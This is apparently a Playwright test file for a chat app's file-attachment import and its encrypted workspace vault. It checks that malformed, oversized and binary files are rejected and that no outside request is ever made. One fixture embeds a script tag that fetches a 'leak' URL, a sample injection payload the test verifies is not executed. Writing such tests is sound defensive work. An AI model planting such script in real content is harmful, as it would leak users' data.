import { workspaceControl } from "./workspace-navigation";
import { test, expect } from "@playwright/test";

test("mixed code/data imports recover from a bad file without disclosure or execution", async ({
  page,
}) => {
  await page.setViewportSize({ width: 390, height: 844 });
  const disclosures: string[] = [];
  page.on("request", (request) => {
    if (
      request.method() !== "GET" ||
      new URL(request.url()).origin !== "http://127.0.0.1:4173"
    )
      disclosures.push(request.url());
  });
  await page.goto("/");
  await page
    .getByLabel("Message CometRow")
    .fill("Explain the synthetic code and compare the data");
  const content =
    "# Synthetic notes\n<script>fetch('https://example.com/leak')</script>\nDo not execute this source.";
  await page.getByLabel("Attach files to this conversation").setInputFiles([
    {
      name: "README.md",
      mimeType: "text/markdown",
      buffer: Buffer.from(content),
    },
    {
      name: "bad.json",
      mimeType: "application/json",
      buffer: Buffer.from([0xc3, 0x28]),
    },
    {
      name: "totals.csv",
      mimeType: "application/octet-stream",
      buffer: Buffer.from("item,price\nsynthetic,12.25\nformula,=SUM(A1:A3)"),
    },
    {
      name: "helper.py",
      mimeType: "text/x-python",
      buffer: Buffer.from("def add(a, b):\n    return a + b\n"),
    },
  ]);
  const results = page.getByRole("region", { name: "File import results" });
  await expect(results).toContainText("helper.py — added");
  await expect(results).toContainText("bad.json — failed");
  await expect(results).toContainText("not UTF-8");
  await expect(
    page
      .getByRole("list", { name: "Conversation attachments" })
      .getByRole("listitem"),
  ).toHaveCount(3);
  await page
    .getByRole("button", { name: "Review README.md", exact: true })
    .click();
  await page.locator(".content-view details summary").first().click();
  await expect(
    page.getByLabel("Text for README.md", { exact: true }),
  ).toHaveValue(content);
  await page
    .getByLabel("Text for README.md", { exact: true })
    .fill(content + "\nCorrection: price is in EUR.");
  await page
    .getByRole("checkbox", { name: "helper.py", exact: true })
    .uncheck();
  await page.addStyleTag({ content: "html { font-size: 30px !important; }" });
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth > innerWidth,
    ),
  ).toBe(false);
  await page.screenshot({
    path: ".local/document-evidence/mobile-import.png",
    fullPage: true,
  });
  await workspaceControl(page, "Saved")
    .click();
  await page
    .getByLabel("Vault passphrase")
    .fill("synthetic document workflow password");
  await page.getByRole("button", { name: "Create or unlock vault" }).click();
  await page.getByRole("button", { name: "Save encrypted snapshot" }).click();
  await expect(
    page.getByText("No unsaved workspace changes.", { exact: false }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Open", exact: true }).click();
  await expect(results).toHaveCount(0);
  await workspaceControl(page, "Saved")
    .click();
  await page.getByRole("button", { name: "Lock and clear workspace" }).click();
  await expect(results).toHaveCount(0);
  await page.reload();
  await workspaceControl(page, "Saved")
    .click();
  await page
    .getByLabel("Vault passphrase")
    .fill("synthetic document workflow password");
  await page.getByRole("button", { name: "Create or unlock vault" }).click();
  await page.getByRole("button", { name: "Open", exact: true }).click();
  await expect(page.getByLabel("Message CometRow")).toHaveValue(
    "Explain the synthetic code and compare the data",
  );
  await page
    .getByRole("button", { name: "Review README.md", exact: true })
    .click();
  await page.locator(".content-view details summary").first().click();
  await expect(
    page.getByLabel("Text for README.md", { exact: true }),
  ).toHaveValue(content + "\nCorrection: price is in EUR.");
  await expect(
    page.getByRole("checkbox", { name: "helper.py", exact: true }),
  ).not.toBeChecked();
  await expect(results).toHaveCount(0);
  expect(disclosures).toEqual([]);
});

test("rejects oversized and disguised binary files and accepts a later valid file", async ({
  page,
}) => {
  await page.goto("/");
  await page.getByLabel("Attach files to this conversation").setInputFiles([
    {
      name: "large.md",
      mimeType: "text/markdown",
      buffer: Buffer.from("x".repeat(60001)),
    },
    {
      name: "binary.ts",
      mimeType: "text/plain",
      buffer: Buffer.from([65, 0, 66]),
    },
    {
      name: "unsupported.docx",
      mimeType: "text/plain",
      buffer: Buffer.from("Not a supported Word document"),
    },
    {
      name: "valid.json",
      mimeType: "application/json",
      buffer: Buffer.from('{"synthetic":true}'),
    },
  ]);
  const results = page.getByRole("region", { name: "File import results" });
  await expect(results).toContainText("valid.json — added");
  await expect(results).toContainText("exceeds 60,000");
  await expect(results).toContainText("not plain text");
  await expect(results).toContainText(
    "unsupported.docx — failed",
  );
  await expect(
    page
      .getByRole("list", { name: "Conversation attachments" })
      .getByRole("listitem"),
  ).toHaveCount(1);
  page.once("dialog", (dialog) => dialog.accept());
  await workspaceControl(page, "New conversation").click();
  await expect(results).toHaveCount(0);
});
